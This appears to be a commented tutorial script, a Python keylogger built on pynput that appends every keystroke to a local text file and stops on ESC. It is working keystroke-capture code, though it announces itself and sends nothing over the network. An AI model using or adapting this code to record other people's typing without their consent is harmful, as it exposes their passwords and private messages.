# Import the necessary module from pynput to listen to keyboard events
from pynput import keyboard

# Define the filename where the keystrokes will be saved
log_file = "key_log.txt"

# This function is called every time a key is pressed
def on_press(key):
    try:
        # Try to log regular character keys (like 'a', '1', etc.)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Write the character directly
    except AttributeError:
        # For special keys (like Enter, Shift, etc.), log them with formatting
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")  # Wrap special key name in brackets

    # Stop the keylogger if the Escape (ESC) key is pressed
    if key == keyboard.Key.esc:
        print("\n🛑 Keylogger stopped.")
        return False  # Returning False stops the listener

# This is the main function that starts the keylogger
def main():
    print("🔴 Keylogger is running... (press ESC to stop)")

    # Create a keyboard listener that monitors key presses and calls 'on_press'
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener running in a loop until stopped

# Run the main function only if the script is being executed directly
if __name__ == "__main__":
    main()
